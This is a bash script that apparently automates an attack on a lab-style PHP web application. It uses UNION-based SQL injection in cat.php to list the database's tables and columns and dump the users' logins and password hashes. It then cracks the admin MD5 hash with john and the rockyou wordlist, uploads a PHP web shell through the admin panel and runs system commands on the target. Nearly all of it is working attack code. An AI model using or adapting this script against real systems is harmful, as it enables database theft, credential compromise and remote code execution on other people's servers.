#!/usr/bin/env bash

if [[ "$#" != "1" ]]; then
  echo $0 IP
  exit
fi

TARGET="$1"
QUERY="http://$TARGET/cat.php"

# function executing vulnerable MySQL query
function mysql_fetch() {
  MYSQL_RET=$(curl --silent --get $QUERY \
		   --data-urlencode "id=$1" 2>&1)
  # error message wrapped between <div id="content"> and <div class=...
  MYSQL_ERR=$(echo -n $MYSQL_RET | \
    sed -e 's/^.*<div id="content">//;
            s/<div class=.*$//;
            s/^[ \t]*//;
            s/[ \t]*$//')
}

# Determine number of columns prior to doing UNION
# Must have at least 2, start trying at 10 until hit 1 or find number of columns
echo "Trying to determine the number of columns in the vulnerable query."
NCOLS=0
MAXCOL=10
for (( i=MAXCOL; i>=2; i-- )); do
  mysql_fetch "0 ORDER BY $i"
  if [[ $MYSQL_ERR == "" ]]; then
    NCOLS=$i
    break
  fi
done
if [[ $NCOLS == 0 ]]; then
  echo "UNION QUERY CANNOT WORK - QUITTING"
  exit
else
  echo "Vulnerable query has $NCOLS COLUMNS"
fi
if [[ $NCOLS -gt 2 ]]; then
  SUFFIX=$(eval printf ',%s' {3..$NCOLS})
else
  SUFFIX=,
fi

# Let's look at the database info
# Must use column 2, the Picture name, to display info
#   @@version
#   current_user()
#   database()
#   table_name, column_name FROM information_schema.columns

echo -e "\nDemo fetching DB version, current user, and database name:"
mysql_fetch "0 UNION SELECT 1,@@version$SUFFIX"
VERSION=${MYSQL_RET##*Picture: }
VERSION=${VERSION%%<*}
echo VERSION=$VERSION

mysql_fetch "0 UNION SELECT 1,current_user()$SUFFIX"
USER=${MYSQL_RET##*Picture: }
USER=${USER%%<*}
echo USER=$USER

mysql_fetch "0 UNION SELECT 1,database()$SUFFIX"
DB=${MYSQL_RET##*Picture: }
DB=${DB%%<*}
echo DB=$DB


# List all tables
mysql_fetch "0 UNION SELECT 1,table_name$SUFFIX FROM information_schema.tables"
echo -e "\n==========\nTABLE LIST\n=========="
while [[ true ]]; do
  MYSQL_REST=${MYSQL_RET#*Picture: }
  [[ $MYSQL_REST == $MYSQL_RET ]] && break
  TABLE=${MYSQL_REST%%<*}
  echo $TABLE
  MYSQL_RET=$MYSQL_REST
done
echo "=========="


# List all columns in table users
mysql_fetch "0 UNION SELECT 1,column_name$SUFFIX FROM \
information_schema.columns WHERE table_name = 'users'"
echo -e "\n=======================\nCOLUMN LIST TABLE users\n======================="
while [[ true ]]; do
  MYSQL_REST=${MYSQL_RET#*Picture: }
  [[ $MYSQL_REST == $MYSQL_RET ]] && break
  COLUMN=${MYSQL_REST%%<*}
  echo $COLUMN
  MYSQL_RET=$MYSQL_REST
done
echo "==========="


# List all login:password in table users
mysql_fetch "0 UNION SELECT 1,concat(login,':',password)$SUFFIX FROM users"
echo -e "\n=========\nUSER LIST\n========="
while [[ true ]]; do
  MYSQL_REST=${MYSQL_RET#*Picture: }
  [[ $MYSQL_REST == $MYSQL_RET ]] && break
  USER=${MYSQL_REST%%<*}
  echo $USER
  MYSQL_RET=$MYSQL_REST
done
echo "========="


# crack the password using the rockyou wordlist
echo "admin:8efe310f9ab3efeae8d410a8e0166eb2" > md5.txt
zcat /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
echo -e "\nCracking the password with john:"
/usr/sbin/john md5.txt --format=raw-md5 --wordlist=rockyou.txt
cat ~/.john/john.pot


# using admin/P4ssw0rd upload a shell execution php script and run a few commands
echo -e "\nUploading shell.php3 then using it to execute shell commands on vulnerable:"
cat >shell.php3 <<'EOF'
<?php
system($_GET['cmd']);
?>
EOF
curl --silent --form action=index.php --form title="shell" \
    --form image="@shell.php3;type=text/plain" --form category=1 \
    --form Add="Add" --form user=admin --form password=P4ssw0rd \
    http://$TARGET/admin/index.php | \
    grep INSERT
echo -e "\nRun the command \"uname -a\""
curl --silent --get http://$TARGET/admin/uploads/shell.php3 \
     --data-urlencode "cmd=uname -a"
echo -e "\nRun the command \"cat /etc/debian_version\""
curl --silent --get http://$TARGET/admin/uploads/shell.php3 \
     --data-urlencode "cmd=cat /etc/debian_version"
